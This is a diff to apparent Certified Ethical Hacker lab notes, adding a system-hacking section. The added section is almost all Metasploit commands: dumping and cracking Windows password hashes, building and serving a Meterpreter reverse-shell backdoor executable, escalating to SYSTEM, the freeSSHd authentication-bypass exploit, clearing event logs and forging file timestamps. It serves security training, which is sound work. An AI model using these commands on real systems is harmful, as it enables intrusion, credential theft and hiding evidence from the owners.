@@ -3,7 +3,7 @@
  * [foot printing and reconnaissance](#foot-printing-and-reconnaissance) 
  * [scanning networks](#scanning-networks)
  * [enumeration](#enumeration)
- * 
+ * [System Hacking](#system-hacking)
  * 
  * 
  * 
@@ -198,19 +198,176 @@ nmap -sU -p 161 --script=snmp-brute 172.19.17.66
 snmpcheck -t 172.17.19.66 -c public | more
 ```
 
+9. LDAP enumeration - ADExplorer (Active Directory Explorer)
+need Domain Admin login --> view everything is AD --> better than AD itself
+
+## System Hacking
+
+1. Dumping and Cracking SAM Hashes - pwdump and ophcrack
+SAM = security account manager database file in windows
+uses LM and NTLM hash
+
+```
+# username and pasword has for the machine in a file
+pwdump.exe > c:/hash.txt
+
+load this file to ophcrack --> time to crack depends on complexity of password --> only alphanumeric
+```
+
+2. Cracking - rainbow tables
+pre-calculate hash and create table --> compare new hash to quickly find plaintext
+
+3. Cracking - L0phtCrack
+
+4. Escalating Priviledge - using client side vulnerability
+kali
+```bash
+service postgresql start
+service metasploit start
+
+# launch msfconsole
+msfconsole
+
+#create exe file in desktop
+msf > msfpayload windows/meterpreter/reverse_tcp LHOST=172.17.19.67 X > Desktop/Exploit.exe
+
+# new folder with appropriate permission
+mkdir /var/www/share
+chmod -R 755 /var/www/share
+chown -R www-data:www-data /var/www/share
+
+service apache2 start
+
+cp /root/Desktop/Exploit.exe /var/www/share/
+
+# create msfconsole handler
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+set LHOST 172.17.19.67
+
+# start handler
+exploit -j -z
+
+```
+
+from windows
+```
+http://172.17.19.67/share
+download and run Exploit.exe
+```
+
+kali
+```
+# metasploit session should not be open in kali
+
+#now go into meterpreter shell
+sessions -i 1
+
+#current user
+getuid
+>>> ceh\administrator
+
+#require elevated priviledge
+
+#get windows password hash
+run hashdump
+
+#clear windows event
+clearev
+
+# unrestricted access to system using Service -named pipe impersonation
+getsystem -t 1
+
+getuid
+>>> nt authority\system
+
+# can run hashdump now
+run hashdump 
+
+```
+
+5. exploiting freeSSHd
+
+install freeSSHd in windows and configure on port 45
 
 
+kali
+```
+service postgresql start
+service metasploit start
+
+msfconsole
+
+use exploit/windows/ssh/freesshd_authbypass
 
 
+#show available exploits
+show options
 
+set RHOST 172.17.19.61
+set RPORT 45
 
+# establish meterpreter session
+exploit
 
+# possible to capture screenshot, keystroke logging, etc
 
+```
 
+6. hacking windows 8.1 with metasploit and post-exploitation using meterpreter
 
+start postgresql, metasploit
+```
+msfconsole
 
+msfpayload windows/meterpreter/reverse_tcp LHOST=172.17.19.67 X > Desktop/Backdoor.exe
 
+ls -la /var/www/ | grep share
 
+service apache2 start
+
+cp /root/Desktop/Backdoor.exe /var/www/share/
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+set LHOST 172.17.19.67
+
+show options
+
+exploit -j -z
+```
+
+windows --> run backdoor.exe
+
+kali
+```
+sessions -i
+
+sessions -i 1
+
+# can traverse through this user profile
+sysinfo
+pwd
+ls
+cat filename.txt
+
+# show file last access
+timestomp filename.txt -v
+
+# change modified timestamp
+timestomp filename.txt -m "06/15/2012 12:57:21"
+
+# change created timestamp
+timestomp filename.txt -c "06/15/2012 12:57:21"
+
+# change accessed timestamp
+timestomp filename.txt -a "06/15/2012 12:57:21"
+
+# change entry modfied timestamp
+timestomp filename.txt -e "06/15/2012 12:57:21"
+```
 
 
 
